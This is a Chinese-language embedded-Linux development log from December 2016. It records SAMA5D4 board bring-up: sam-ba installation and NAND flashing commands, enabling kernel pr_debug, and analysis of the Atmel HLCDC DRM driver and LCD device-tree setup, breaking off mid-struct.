20161207
linux上使用EDBG:
	开发板 EDGB_USB 接到linux dmesg:	
[308172.946989] usb 2-1.2: new high-speed USB device number 4 using ehci-pci
[308173.039761] usb 2-1.2: config 1 interface 2 altsetting 0 bulk endpoint 0x84 has invalid maxpacket 64
[308173.039771] usb 2-1.2: config 1 interface 2 altsetting 0 bulk endpoint 0x5 has invalid maxpacket 64
[308173.040772] usb 2-1.2: New USB device found, idVendor=03eb, idProduct=2111
[308173.040780] usb 2-1.2: New USB device strings: Mfr=1, Product=2, SerialNumber=3
[308173.040785] usb 2-1.2: Product: EDBG CMSIS-DAP
[308173.040790] usb 2-1.2: Manufacturer: Atmel Corp.
[308173.040793] usb 2-1.2: SerialNumber: ATML0000004141319438
[308173.044631] hid-generic 0003:03EB:2111.000E: hiddev0,hidraw1: USB HID v1.11 Device [Atmel Corp. EDBG CMSIS-DAP] on usb-0000:00:1d.0-1.2/input0
[308173.185664] cdc_acm 2-1.2:1.1: ttyACM0: USB ACM device
[308173.186015] usbcore: registered new interface driver cdc_acm
[308173.186019] cdc_acm: USB Abstract Control Model driver for USB modems and ISDN adapters
	直接就连上了,不用手动去装驱动文件	
	用SecureCRT连接ttyACM0:115200,8,N,1可观察输出	
linux上使用sam-ba烧录:
	开发板 A5-USB-A 接到linux dmsg:
[310103.548967] usb 1-1.2: new high-speed USB device number 17 using ehci-pci
[310103.642544] usb 1-1.2: New USB device found, idVendor=0525, idProduct=a4a7
[310103.642554] usb 1-1.2: New USB device strings: Mfr=1, Product=2, SerialNumber=0
[310103.642560] usb 1-1.2: Product: Gadget Serial v2.4
[310103.642564] usb 1-1.2: Manufacturer: Linux 4.1.0-linux4sam_5.3 with atmel_usba_udc
[310103.649274] cdc_acm 1-1.2:2.0: ttyACM1: USB ACM device
	安装sam-ba到linux,直接atmel下载sam-ba_3.1.4-linux_x86_64.tar.gz,解压即用(cd到samba目录,./sam-ba)
	提示/usr/lib/x86_64-linux-gnu/libstdc++.so.6: version `CXXABI_1.3.9' not found, 相当麻烦,暂时放弃linux烧录
	









20161208	
尝试编译:
	make ARCH=arm sama5_defconfig
	make ARCH=arm menuconfig	//只选 sama5d4 的板子
	make ARCH=arm CROSS_COMPILE=arm-linux-
	error:
	/tmp/ccnZ9dmH.s: Assembler messages:
	/tmp/ccybbHfr.s:176: Error: garbage following instruction -- `dsb nshst'
	/tmp/ccybbHfr.s:184: Error: garbage following instruction -- `dsb nsh'
	编译器版本不对:










20161220
重新安装 sam-ba_3.1.4到ubuntu
	sudo tar -zxvf sam-ba_3.1.4-linux_x86_64.tar.gz -C /opt		//解压到/opt
	到 /opt/sam-ba_3.1.4 目录下
	sudo gedit ~/.bashrc 修改 常用户的.bashrc,末尾添加,搜索库路径:
		LD_LIBRARY_PATH=/usr/local/lib64/:$LD_LIBRARY_PATH
		export LD_LIBRARY_PATH
	source ~/.bashrc 更新用户bashrc配置 
		(如果不添加搜索库路径会出现,
		sam-ba: symbol lookup error: sam-ba: undefined symbol: _ZN7QString18toLocal8Bit_helperEPK5QChari
		等没有找到相关lib参数的错误)
	sudo cp sam-ba /bin/sam-ba	拷贝执行文件到执行文件目录下,然后就可以使用sam-ba命令了
	sam-ba 输入命令,从输出中验证是否正确安装.
	提示/usr/lib/x86_64-linux-gnu/libstdc++.so.6: version `CXXABI_1.3.9' not found, 
		安装更新的gcc工具,从而更新 C++ 库文件
		sudo add-apt-repository ppa:ubuntu-toolchain-r/test
		sudo apt-get update
		sudo apt-get install gcc-4.9 g++-4.9
然后测试:
	sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a lowlevel	//测试是否链接到开发板!!
	一直提示 unknown port:	
	发现原来:sam-ba_3.1.4 /sam-ba 本身也只是一个软连接,并不是真正的执行bin文件,这不是重点
	上述安装思路:拷贝lib到系统搜索库,把执行bin拷到环境变量下,但是由于sam-ba 本身也只是一个软连接,所以最后运行功能并不完全
	比如正确的sam-ba指令,却出现各种错误,如段错误,uknown port...开始怀疑是由于搜不到其他关键配置文件或者lib文件有关!!
最后选择另外一条安装思路:
	直接把这个 /opt/sam-ba_3.1.4 路径加入到环境变量里去!!!
	sudo gedit ~/.bashrc 修改 常用户的.bashrc,末尾添加
		export PATH=$PATH:/opt/sam-ba_3.1.4
	source ~/.bashrc 更新用户bashrc配置
	这样,sam-ba需要搜索什么文件都可以直接在自身路径找到!!
	再次测试,一直提示:无权访问 serial ttyACM1,加sudo,表示找不到sam-ba命令
	把/opt/sam-ba_3.1.4 路径也加入到root用户的环境变量里去
	sudo gedit /root/.bashrc 修改 root用户的.bashrc,末尾添加:
		export PATH=$PATH:/opt/sam-ba_3.1.4
	sudo source /.bashrc 更新root用户bashrc配置
	su 到root用户
	再次测试,成功!
	然而,回到常用户,加sudo,依然表示找不到sam-ba命令!!
于是发现了 root用户 不等于 加sudo的常用户 !!
	加sudo, root用户, 常用户区别:
		root用户 和 常用户 都有自己的环境变量!!
		root用户一直以最高权限执行命令,都能执行
		常用户以常规权限执行命令,不一定能执行
		常用户加sudo,并没有转变当前用户,但是可以提高到最高权限执行命令
		但是加sudo时,常用户不再使用自己的环境变量,而是转到使用secure_path的环境变量上来,
		即不使用.bashrc里修改过的环境变量
	然而,secure_path的环境变量上没有我们的sam-ba命令,所以常用户加sudo后,并没有找到命令
	解决办法是:
		要求在常用户加sudo时,不自动转变到secure_path的环境变量上去
		sudo gedit ~/.bashrc 修改 常用户的.bashrc,末尾添加
			alias sudo='sudo env PATH=$PATH'
		source ~/.bashrc 更新常用户bashrc配置
最后,通过测试,sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a lowlevel
至此,sam-ba实现所用功能!!
烧录sama5d4步骤：(测试使用的demo来自许工的linux4sam_5.3,非自己下载的更新版本的5.3)
	套上 BOOT_DIS 帽,转到SAMS5D4芯片固化程序的位置
	插上 A5-USB-A 供电，usb成功连接为AT91 USB to Serial Converter （COMx）
	取出 BOOT_DIS 帽,转到 NANDFlash 位置
	检查连接：
	sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a lowlevel //然后会检测连接到usb串口的连接情况
	擦除nandflash：
	sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c erase	
注意,先 cd 到 烧录文件所在目录!!
	烧写 bootloader_1：
	sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c writeboot:at91bootstrap-sama5d4_xplained.bin
	烧写 bootloader_2：
	sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c write:u-boot-sama5d4-xplained.bin:0x40000
	烧写 env (包含commandline/bootargs)：
	sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c write:u-boot-env-sama5d4-xplained.bin:0xC0000
	烧写 device tree block 表：
	sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c write:at91-sama5d4_xplained.dtb:0x180000
	烧写 kernel：
	sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c write:zImage-sama5d4-xplained.bin:0x200000
	烧写 rootfs：
	sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c write:atmel-xplained-demo-image-sama5d4-xplained.ubi:0x800000
镜像组合烧写命令:(注意,先 cd 到 烧录文件所在目录!!)
sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c erase -c writeboot:at91bootstrap-sama5d4_xplained.bin -c write:u-boot-sama5d4-xplained.bin:0x40000 -c write:u-boot-env-sama5d4-xplained.bin:0xC0000 -c write:at91-sama5d4_xplained.dtb:0x180000 -c write:zImage-sama5d4-xplained.bin:0x200000 -c write:atmel-xplained-demo-image-sama5d4-xplained.ubi:0x800000

开pr_debug
例子:打开 i2c模块的 pr_debug:
1,查看:
	drivers/i2c/Makefile:有 ccflags-$(CONFIG_I2C_DEBUG_CORE) := -DDEBUG
	drivers/i2c/busses/Makefile:有 ccflags-$(CONFIG_I2C_DEBUG_CORE) := -DDEBUG
	表示支持 debug
	(注意:ccflags-y  := -DDEBUG	//相当于给mfd目录下的所有文件都加上了 (#define DEBUG))
2,打开.config观察:
	# CONFIG_I2C_DEBUG_BUS is not set
	# CONFIG_I2C_DEBUG_BUS is not set
	表示之前编译的没有打开!!
3,make ARCH=arm menuconfig
	Device Drivers -> I2C support ->
		(*)I2C Core debugging message
		(*)I2C Bus debugging message
	打开重新生成的.config观察
		# CONFIG_I2C_DEBUG_BUS=y
		# CONFIG_I2C_DEBUG_BUS=y
	表示打开了!!
4,include/linux/printk.h中:修改:
	//#define CONSOLE_LOGLEVEL_DEFAULT 7 
	#define CONSOLE_LOGLEVEL_DEFAULT 8 
	由于这样设置的 pr_debug 使用printk(KERN_DEBUG...)
	而printk(KERN_DEBUG...)的级别是7,#define CONSOLE_LOGLEVEL_DEFAULT 7 表示,只打印 小于级别7的消息
	所以改为: #define CONSOLE_LOGLEVEL_DEFAULT 8
5,重新编译(烧录并测试成功!!)
6,补充:
	pr_debug()在include/linux/printk.h 定义,按道理驱动文件中加入(#incude <linux/kernel.h>)就可以使用
	pr_debug()其实可以设置为两种模式,上述只是设置成静态模式(kernel初始化时可以输出消息)










20161221
备份烧写命令:
组合烧写：(不烧写env ，这样可以使用默认的uboot命令，自编译 zImage + dtb + ubifs + uboot + at91bootstrap)
sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c erase -c writeboot:at91bootstrap-sama5d4_xplained.bin -c write:u-boot-sama5d4-xplained.bin:0x40000 -c write:at91-sama5d4_xplained.dtb:0x180000 -c write:zImage:0x200000 -c write:atmel-xplained-demo-image-sama5d4-xplained.ubi:0x800000
只刷新 zImage + dtb
sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c erase:0x200000:0x600000 -c erase:0x180000:0x80000 -c write:at91-sama5d4_xplained.dtb:0x180000 -c write:zImage:0x200000
只刷新 zImage
sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c erase:0x200000:0x600000 -c write:zImage:0x200000

编译完自动拷贝zImage到/demo
arch/arm/boot/Makefile:
$(obj)/zImage:	$(obj)/compressed/vmlinux FORCE
	$(call if_changed,uimage)
	@$(kecho) '  Image $@ is ready'
	cp $(obj)/uImage /home/infortech-ubuntu-1404/SAMA5D4/demo/		//编译完自动拷贝文件到demo

给 atmel_hlcdc 加入 pr_debug
1,先改 platform_driver_的注册
	原来:!!module_platform_driver(atmel_hlcdc_driver);
	先观察:
	printk.h
	/* If you are writing a driver, please use dev_dbg instead */
	#if defined(CONFIG_DYNAMIC_DEBUG)
	/* dynamic_pr_debug() uses pr_fmt() internally so we don't need it here */
	#define pr_debug(fmt, ...) \
		dynamic_pr_debug(fmt, ##__VA_ARGS__)
	#elif defined(DEBUG)
	#define pr_debug(fmt, ...) \
		printk(KERN_DEBUG pr_fmt(fmt), ##__VA_ARGS__)	//静态模式的pr_debug
	#else
	#define pr_debug(fmt, ...) \
		no_printk(KERN_DEBUG pr_fmt(fmt), ##__VA_ARGS__)
	#endif
	
	Platform_device.h
	#define module_platform_driver(__platform_driver) \
		module_driver(__platform_driver, platform_driver_register, \
				platform_driver_unregister)
	#define platform_driver_register(drv) \
		__platform_driver_register(drv, THIS_MODULE)
	void platform_driver_unregister(struct platform_driver *drv)
	{
		driver_unregister(&drv->driver);
	}
	
	device.h
	#define module_driver(__driver, __register, __unregister, ...) \
	static int __init __driver##_init(void) \
	{ \
		return __register(&(__driver) , ##__VA_ARGS__); \	//注意platform_driver_register只有一个参数,__VA_ARGS__不用管
	} \
	module_init(__driver##_init); \
	static void __exit __driver##_exit(void) \
	{ \
		__unregister(&(__driver) , ##__VA_ARGS__); \		//注意platform_driver_unregister只有一个参数,__VA_ARGS__不用管
	} \
	module_exit(__driver##_exit);
然后修改:!!
	atmel-hlcdc.c 加
	#include <linux/kernel.h>	//包含 printk.h
	static int __init atmel_hlcdc_driver_init(void) 
	{
		pr_debug("atmel-hlcd platform-driver registered !!")	//添加打印项!!
		return platform_driver_register(&atmel_hlcdc_driver);	
	}
	module_init(atmel_hlcdc_driver_init);
	static void __exit atmel_hlcdc_driver_exit(void)
	{
		platform_driver_unregister(&atmel_hlcdc_driver);
	}
	module_exit(atmel_hlcdc_driver_exit);
	
	drivers/mfd/Ｍakefile加入:
	ccflags-y  := -DDEBUG		//相当于给mfd目录下的所有文件都加上了 (#define DEBUG)
	经测试成功启动打印!!

然后开启 hlcd 的 dts !!!
	atmel-hlcdc.c 添加
	static int atmel_hlcdc_probe(struct platform_device *pdev)
	{	
	....
		//by william
		pr_debug("atmel-hlcdc probe start !!\n ")	//添加probe打印项!!
		....
	at91-sama5d4_xplained.dts添加:
		...
		ahb {
			apb {
				hlcdc: hlcdc@f0000000 {
					status = "okay";
				};
			.....
	编译dtb!! (直接使用make ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- -j8 编译内核命令就可以自动更新stb了!!)
	只刷新 zImage + dtb 成功打印,即成功添加 hlcdc 的 platform_device!!

再给 atmel_hlcdc_dc 加入 pr_debug
	atmel-hlcdc_dc.c 加
	#include <linux/kernel.h>	//包含 printk.h
	static int atmel_hlcdc_dc_drm_probe(struct platform_device *pdev)
	{
		//by william
		pr_debug("atmel-hlcdc-dc probe start !!\n");
		.......
	drivers/gpu/Makefile加入:	//失败操作
	ccflags-y  := -DDEBUG		//相当于给gpu目录下(不包括多级子目录下的文件)的所有文件都加上了 (#define DEBUG) 
					//所以这样并没有成功添加 pr_debug()
	drivers/gpu/drm/atmel-hlcdc/Makefile加入:	//正确操作
	ccflags-y  := -DDEBUG				//相当于给atmel-hlcdc目录下的所有文件都加上了 (#define DEBUG) 
	经测试成功启动打印!!	
				
分析 atmel-hlcdc_probe!!
	atmel_hlcdc 是一个mfd设备(复合设备),包含atmel-hlcdc-dc设备, 和pwm-atmel-hlcdc设备!!
	重点结构体:
	static const struct mfd_cell atmel_hlcdc_cells[] = {
		{
			.name = "atmel-hlcdc-pwm",
			.of_compatible = "atmel,hlcdc-pwm",
		},
		{
			.name = "atmel-hlcdc-dc",
			.of_compatible = "atmel,hlcdc-display-controller",
		},
	};
	struct atmel_hlcdc_regmap {
		void __iomem *regs;
	};
	struct atmel_hlcdc {
		struct regmap *regmap;
		struct clk *periph_clk;
		struct clk *sys_clk;
		struct clk *slow_clk;
		int irq;
	};
atmel-hlcdc_probe 流程:
	分配一个 struct atmel_hlcdc_regmap 空间内存 *hregmap	//devm_kzalloc
	分配一个 struct atmel_hlcdc 空间内存 *hlcdc
	初始化 atmel_hlcdc:
		获取resource,然后把得到指针给 hregmap->regs
			(补充:platform_get_resource(pdev, IORESOURCE_MEM, 0); IORESOURCE_MEM表示获取的就是dt节点node 的reg内容)
		获取中断号
		在操作clock前,先获取对应的 struct clk 指针:	//devm_clk_get
			periph_clk,
			sys_clk,
			slow_clk,
		初始化 atmel-hlcdc_regmap,返回指针		//devm_regmap_init
	把 atmel_hlcdc 这个数据的指针 挂入 dev->driver_data	//dev_set_drvdata, 
								//注意旧版kernel是挂入private_data的,4.1 kernel 的 struct device 变化了.
	hlcdc是一个复合设备,所以,接下来初始化子设备:		//mfd_add_devices -> mfd_add_device
		就是根据当前 struct mfd_cell 即atmel_hlcdc_cells[] 初始化 子设备的platform_device结构,
		然后通过 platform_device_add 注册到 platform_bus !!

注册了子设备atmel-hlcd-dc(display-control)的platform_device到platform_bus,自然就要执行对应的probe!!,分析:
	知识补充:	
	drm 是一个 GPU 显示框架!!,在内核级别提供内存管理，中断处理， DMA控; 为应用程序提供统一的操作接口
	重点结构体:
	static struct drm_driver atmel_hlcdc_dc_driver = {
		.driver_features = DRIVER_HAVE_IRQ | DRIVER_GEM |
				   DRIVER_MODESET | DRIVER_PRIME |
				   DRIVER_ATOMIC,
		.preclose = atmel_hlcdc_dc_preclose,
		.lastclose = atmel_hlcdc_dc_lastclose,
		.irq_handler = atmel_hlcdc_dc_irq_handler,
		.irq_preinstall = atmel_hlcdc_dc_irq_uninstall,
		.irq_postinstall = atmel_hlcdc_dc_irq_postinstall,
		.irq_uninstall = atmel_hlcdc_dc_irq_uninstall,
		.get_vblank_counter = drm_vblank_count,
		.enable_vblank = atmel_hlcdc_dc_enable_vblank,
		.disable_vblank = atmel_hlcdc_dc_disable_vblank,
		.gem_free_object = drm_gem_cma_free_object,
		.gem_vm_ops = &drm_gem_cma_vm_ops,
		.prime_handle_to_fd = drm_gem_prime_handle_to_fd,
		.prime_fd_to_handle = drm_gem_prime_fd_to_handle,
		.gem_prime_import = drm_gem_prime_import,
		.gem_prime_export = drm_gem_prime_export,
		.gem_prime_get_sg_table = drm_gem_cma_prime_get_sg_table,
		.gem_prime_import_sg_table = drm_gem_cma_prime_import_sg_table,
		.gem_prime_vmap = drm_gem_cma_prime_vmap,
		.gem_prime_vunmap = drm_gem_cma_prime_vunmap,
		.gem_prime_mmap = drm_gem_cma_prime_mmap,
		.dumb_create = drm_gem_cma_dumb_create,
		.dumb_map_offset = drm_gem_cma_dumb_map_offset,
		.dumb_destroy = drm_gem_dumb_destroy,
		.ioctls	= atmel_ioctls,
		.num_ioctls= ARRAY_SIZE(atmel_ioctls),
		.fops = &fops,
		.name = "atmel-hlcdc",
		.desc = "Atmel HLCD Controller DRM",
		.date = "20141504",
		.major = 1,
		.minor = 0,
	};
	struct drm_device {
		....
		struct device *dev;
		char *unique;				/**< unique name of the device */
		/*
		 * At load time, disabling the vblank interrupt won't be allowed since
		 * old clients may not call the modeset ioctl and therefore misbehave.
		 * Once the modeset ioctl *has* been called though, we can safely
		 * disable them when unused.
		 */
		bool vblank_disable_allowed;
		/*
		 * If true, vblank interrupt will be disabled immediately when the
		 * refcount drops to zero, as opposed to via the vblank disable
		 * timer.
		 * This can be set to true it the hardware has a working vblank
		 * counter and the driver uses drm_vblank_on() and drm_vblank_off()
		 * appropriately.
		 */
		bool vblank_disable_immediate;
		/* array of size num_crtcs */
		struct drm_vblank_crtc *vblank;
		spinlock_t vblank_time_lock;    /**< Protects vblank count and time updates during vblank enable/disable */
		spinlock_t vbl_lock;
		u32 max_vblank_count;           /**< size of vblank counter register */
		/**
		 * List of events
		 */
		struct list_head vblank_event_list;
		spinlock_t event_lock;
		struct platform_device *platformdev; /**< Platform device struture */
		......
	};
	static const struct of_device_id atmel_hlcdc_of_match[] = {
		.........
		{
			.compatible = "atmel,sama5d4-hlcdc",
			.data = &atmel_hlcdc_dc_sama5d4,
		},
		{ /* sentinel */ },
	};
	static const struct atmel_hlcdc_dc_desc atmel_hlcdc_dc_sama5d4 = {
		.min_width = 0,
		.max_width = 2048,
		...//详细见 atmel_hlcdc_dc.c
	};
	struct device {
		struct device *parent;
		struct device_private *p;
		struct device_node of_node;	//解压 dtb 后,存储device tree 节点的数据结构!!!
		.....
	};
	struct device_node {			//解压 dtb 后,存储device tree 节点的数据结构!!!
		const char *name;
		const char *type;
		phandle phandle;
		const char *full_name;
		struct fwnode_handle fwnode;
		struct	property *properties;
		struct	property *deadprops;	/* removed properties */
		struct	device_node *parent;
		struct	device_node *child;
		struct	device_node *sibling;
		struct	kobject kobj;
		unsigned long _flags;
		void	*data;
	#if defined(CONFIG_SPARC)
		const char *path_component_name;
		unsigned int unique_id;
		struct of_irq_controller *irq_trans;
	#endif
	};
	struct atmel_hlcdc_dc {
		const struct atmel_hlcdc_dc_desc *desc;
		struct atmel_hlcdc *hlcdc;
		struct drm_fbdev_cma *fbdev;
		struct drm_crtc *crtc;
		struct atmel_hlcdc_planes *planes;
		struct atmel_hlcdc_layer *layers[ATMEL_HLCDC_MAX_LAYERS];
		struct workqueue_struct *wq;
		struct {
			wait_queue_head_t wait;
			bool pending;
		} commit;
	};
atmel-hlcdc-dc_probe 流程:			//atmel_hlcdc_dc_drm_probe
	分配一个 drm_device 空间内存 *ddev	//drm_dev_alloc
	初始化 ddev
		设置这个drm设备的唯一设备名		//drm_dev_set_unique
		加载初始化 atmel-hlcdc-dc 到ddev	//atmel_hlcd_dc_load (包括了atmel-hlcdc-dc的platform_device注册?)
		注册ddev到 drm框架?		//drm_dev_register
		注册对应的用户空间接口到drm框架?	//atmel_hlcdc_dc_connector_plug_all -> drm_connector_register
atmel_hlcd_dc_load 分析!!!
	匹配 hlcdc 的 compatible (注意不是 hlcd_dc 的 compatible)!!
	分配一个 atmel_hlcd_dc 空间内存 *dc	//devm_kzalloc
	初始化 dc
		建立一个工作队列名为atmel-hlcdc-dc	//dc->wq = alloc_ordered_workqueue(...)
		初始化等待队列				//init_waitqueue_head()
		dc->desc = match->data;
		dc->hlcdc = dev_get_drvdata(dev->dev->parent);
		ddev->dev_private = dc;			//源码是dev->dev_private = dc;实际上dev对应上述分析的 ddev
		启动periph_clk				//clk_prepare-enable -> clk_enable( 奇怪是在不到clk_enable源码!!)
							//clk_enable 没个厂家都有自己的clk_enable,找不到at91架构的!!!
	启动 atmel_hlcd_dc 电源管理(PM)		//pm_runtime_enable
	drm_vblank初始化			//drm_vblank_init	vblank显示完前帧图案与开始显示下一帧团之间的中间过程!!
	设置 atmel_hlcd_dc			//atmel_hlcdc_dc_modeset_init (关于芯片硬件模块寄存器的初始化了???)
	重置 drm 模式 ???			//drm_mode_config_reset
	初始化 drm_irq ???			//drm_irq_install
	把驱动数据挂入ddev			//platform_set_drvdata
	初始化,使能 output polling???		//drm_kms_helper_poll_init	窗口显示激活
	检测 是否发现热插拔设备???			//drm_helper_hpd_irq_event		
	(未完待续,下一天的开发log讨论!!>>>) 	










20161223
先补充 linux drm(direct rending manager) 设备的框架知识!!
	过去.用户程旭,直接操显卡设备来显示图像,这样,用户程序含大量针对特定显卡的接口程序,不利于移植,
	现在,linux建议使用自身提供的 抽象出的 drm设备驱动 来做访问操作显卡的工作,而drm面向用户程序则提供统一的ioctl接口, 
		这样,就更方便用户程序的移植,也对各种厂商的显卡操作有统一的管理
	DRM提供两类 ioctl 行为:GEM(Graphics Execution Manager),KMS(Kernel Mode-Setting)
	GEM针对 Framebuffer(显存)管理,
		如显存的申请释放 (Framebuffer managing)，显存共享机制 (Memory sharing objects)，及显存同步机制 (Memory synchronization)
	KMS 主要是完成显卡配置 (Display mode setting)
	atmel-hlcdc文件中,哪些对应KMS, 哪些对应GEM?
		atmel_hlcdc_crtc.c atmel_hlcdc_dc.c atmel_hlcdc_layer.c atmel_hlcdc_output.c atmel_hlcdc_plane.c
	显卡主要是由三类设备组成：
		Processing logic 指的是神秘的 GPU 模块，
		Display controller 指的是 LCDC 控制器，
		Hardware video acceleration 指的就是具体的显示接口 HDMI / eDP / … 
	DRM KMS 对于显卡设备驱动有三个概念 CRTC / Encoder / Connector,
		CRTC 就是指 Display Controller,CRTC 的常用行为如下：
      			DPMS (Display Power Manage System) 电源状态管理 (crtc_funcs->dpms)
			将 Framebuffer 转换成标准的 LCDC Timing ，其实就是一帧图像刷新的过程（crtc_funs->mode_set）
			帧切换，即在 VBlank 消影期间，切换 Framebuffer（crtc_funcs->page_flip）
			Gamma 校正值调整（crtc_funcs->gamma_set）
		Encoder 就是指具体接口驱动 eDP / HDMI,Encoder 的常用行为如下：
			DPMS (Display Power Manage System) 电源状态管理 (encoder_funcs->dpms)
			将 VOP 输出的 lcdc Timing 打包转化为对应接口时序 HDMI TMDS / … (encoder_funcs->mode_set)
		Connector 指的是具体外接的屏幕 Monitor / Panel。Connector 的常用行为如下：
			获取上报 热拔插 Hotplug 状态
			读取并解析屏 (Panel) 的 EDID 信息
	drm 其他概念:
		pagefilp:帧刷屏
		plane:	(drm 的plane相当与,芯片上的图层,plane是drm软件架构上的图层,具有广泛意义!!,overlay是芯片硬件上的图层,)
			(由于实现的功能类似,所以这里的 plane 一般直接映射 硬件的overlay )
			(所以可以说,plane 是 芯片layer 与 linux-drm模块 的接口)
			A plane represents an image source that can be blended with 
			or overlayed on top of a CRTC during the scanout process
		CRTC:	A CRTC is an abstraction representing a part of the chip that contains a pointer to a scanout buffer
	简单以 HDMI Monitor 显示的过程为例，实例解析下 CRTC / Encoder / Connector 的行为：
		1. 首先 HDMI 驱动检测到电视 Plugin 信号，读出电视的 EDID 信号，获取电视的分辨率信息 (DRM Connector)。
		2. Userspace 将需要显示的数据填充在 framebuffer 里面，然后通过 libdrm 接口通知 VOP 设备开始显示。
		3. 接着 VOP 驱动将 framebuffer 里面的数据转换成标准的 LCDC Timing 时序 (DRM CRTC)。
		4. 同时 HDMI 驱动将 HDMI 硬件模块的 LCDC 时序配置与 VOP 输出时序一致，
		   准备将输入的 LCDC Timing 转化为电视识别的 HDMI TMDS 信号 (DRM Encoder)。
补充 linux runtime PM 框架知识!!
	(未完)
补充 sama5d4 lcdc 框架知识!!
	datasheet:page668 寄存器列表
	datasheet:page633表示:
		图像数据通过 DEAG: DMA Engine Address Generation 流入 各layer图层
		各layer图层再经过 GAB: Global Alpha Blender 混合成图片,
		然后通过硬件时序模块输出如rgb信号到lcd屏从而成像!!!
	The LCD module integrates the following digital blocks:(基本重点模块简介)
		DMA Engine Address Generation (DEAG)—This block performs data prefetch and requests access to the AHB interface.
		Input Overlay FIFO—Stores the stream of pixels
		Color Lookup Table (CLUT)—These 256 RAM-based lookup table entries are selected 
		 	when the color depth is set to 1, 2, 4 or 8 bpp.
		Chroma Upsampling Engine (CUE)—This block is selected when the input image sampling format is YUV (Y’CbCr) 4:2:0 
			and converts it to higher quality 4:4:4 image.
		Color Space Conversion (CSC)—changes the color space from YUV to RGB
		Two Dimension Scaler (2DSC)—Resizes the image
		Global Alpha Blender (GAB)—Performs programmable 256-level alpha blending
		Output FIFO—Stores the blended pixel prior to display
		LCD Timing Engine—Provides a fully programmable HSYNC-VSYNC interface
	The DMA controller reads the image through the AHB master interface. The LCD controller engine formats the
		display data, then the GAB performs alpha blending if required, and writes the final pixel into the output FIFO. The
		programmable timing engine drives a valid pixel onto the LCD_DAT[23:0] display bus.
	Input FIFO:	the LCD module includes one input FIFO per overlay. These input FIFOs are used to buffer the AHB burst and
		serialize the stream of pixels.
	Output FIFO:	The LCD module includes one output FIFO that stores the blended pixel.
	
	layer(图层),有如下几层: 
		overlay1(覆盖层1,即图层1)
		overlay2(覆盖层2,即图层2)
		base layer(基础层)
		high end Overlay(高端图层)
		每个图层都可以选择存放color lookup table 或者 RGB 编码的像素点pix图像
		而高端图层更可以选择 yuv 编码的像素点的图像
	GAB: Global Alpha Blender(alpha搅拌器,即图层混合器)
紧接之前分析:atmel_hlcd_dc_load 里对硬件的初始化应该集中在 atmel_hlcdc_dc_modeset_init:
	设置 drm 相关参数?		//drm_mode_config_init
		INIT_LIST_HEAD(&dev->mode_config.fb_list);
		INIT_LIST_HEAD(&dev->mode_config.crtc_list);
		INIT_LIST_HEAD(&dev->mode_config.connector_list);
		INIT_LIST_HEAD(&dev->mode_config.encoder_list);
		INIT_LIST_HEAD(&dev->mode_config.property_list);
		INIT_LIST_HEAD(&dev->mode_config.property_blob_list);
		INIT_LIST_HEAD(&dev->mode_config.plane_list);
		idr_init(&dev->mode_config.crtc_idr);
		idr_init(&dev->mode_config.tile_idr);
	建立 outputs 设备??		//atmel_hlcdc_create_outputs(其实就是发现hlcd-display-controler的子设备节点 port 接口,并初始化!!)
	建立 planes ??			//atmel_hlcdc_create_planes
		设置layer
	建立 crtc ??			//atmel_hlcdc_crtc_create
	设置 mode_config_funcs		//ddev->mode_config.funcs = &mode_config_funcs;
		static const struct drm_mode_config_funcs mode_config_funcs = {
			.fb_create = atmel_hlcdc_fb_create,
			.output_poll_changed = atmel_hlcdc_fb_output_poll_changed,
			.atomic_check = drm_atomic_helper_check,
			.atomic_commit = atmel_hlcdc_dc_atomic_commit,
		};
快速查找出错处!! 对比输出错误码ret 与 errno.h里的数据
怀疑 hdmi 与 drm 有关系,于是查看了资料,发现:
	sama5d4并没有hdmi模块,而是通过外接 sil9022 芯片 把 rgb777 信号转为 hdmi信号输出,而sil9022也是通过i2c与sama5d4通讯
	也就是说,hdmi不是芯片自己实现的,还是需要类型\cd信号输出然后通过转换芯片转换
所以参考hdmi的dts,试写lcd信号的设备树信息
	出现错误!! failed to create HLCDC outputs: -517
	加 pr_debug 和对比 hdmi_dts发现是hdmi_dts的 of_drm_find_bridge 正确输出!! 











20161226
补充:裸屏参数!!
	800 X 480 pixel
	108(H) X 64.8(V) mm
	each pixel: 0.135(H) x 0.135(V) mm
	DotCLK: 33.36MHZ
	FRAME frequency: 60 hz
	lcd_power: 3.3V	  110mA   363mW
	backlight: 23.1V  40ma	  924mW 
继续挖掘 DRM 有用信息!!!

继承试写 lcd dts节点 ,
	发现,之前atmel_create_uotputs失败,是因为 atmel_hlcdc_check_endpoint失败!!,然而换作预装hdmi的dts时,却成功!!
	原来hdmi的dts里 的 sil9022节点模块,使用了 drm_bridge_add(),所以 atmel_hlcdc_check_endpoint->of_drm_find_bridge 正确输出 
	所所谓的 bridge 可以理解为 drm 的 encoder 
	不使用 sil9022模块的我们应该如何修改 ??
	从 check_endpoint 看到了,除了 bridge 匹配的方式外,还有 panel 匹配方式, 
	查看代码,发现drm/panel被编译了,也就说,可以尝试在这里添加 信息,用于匹配!!
先pannel 添加 pr_debug:
	panel/Makefile: 添加 ccflags-y := -DDEBUG
	panel-simple.c 添加:
	#include <linux/kernel.h>
	然后就可以在要检测的地方加pr_debug
再次改写dts!!
	panel-simple.c 添加:
	static const struct drm_display_mode atmel_lcd_display_control_mode = {
		.clock = 33260,
		.hdisplay = 800,
		.hsync_start = 800 + 168,
		.hsync_end = 800 + 168 + 64,
		.htotal= 800 + 168 + 64 + 88,
		.vdisplay = 480,
		.vsync_start = 480 + 37,
		.vsync_end = 480 + 37 + 2,
		.vtotal = 480 + 37 + 2 + 8,
